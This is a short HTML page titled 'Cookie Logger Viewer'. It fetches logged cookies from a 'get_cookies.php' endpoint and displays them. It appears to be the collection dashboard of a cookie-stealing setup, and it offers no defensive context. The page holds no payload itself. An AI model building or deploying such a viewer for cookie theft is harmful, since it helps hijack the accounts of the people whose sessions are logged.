<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <title>üç™ Cookie Logger Viewer</title>
    <style>
        body {
            font-family: monospace;
            background: #111;
            color: #0f0;
            padding: 20px;
        }

        .box {
            border: 1px solid #0f0;
            padding: 10px;
            background: #000;
            margin-top: 20px;
            white-space: pre-wrap;
        }
    </style>
</head>

<body>
    <h2>üç™ Cookie Logger Viewer</h2>
    <div class="box" id="cookieBox">Loading cookies...</div>

    <script>
        fetch('get_cookies.php')
            .then(res => res.json())
            .then(data => {
                const box = document.getElementById('cookieBox');
                if (data.length > 0) {
                    box.innerText = data.join("\n");
                } else {
                    box.innerText = "No cookies logged yet.";
                }
            })
            .catch(err => {
                document.getElementById('cookieBox').innerText = "Error loading cookies.";
                console.error(err);
            });
    </script>
</body>

</html>
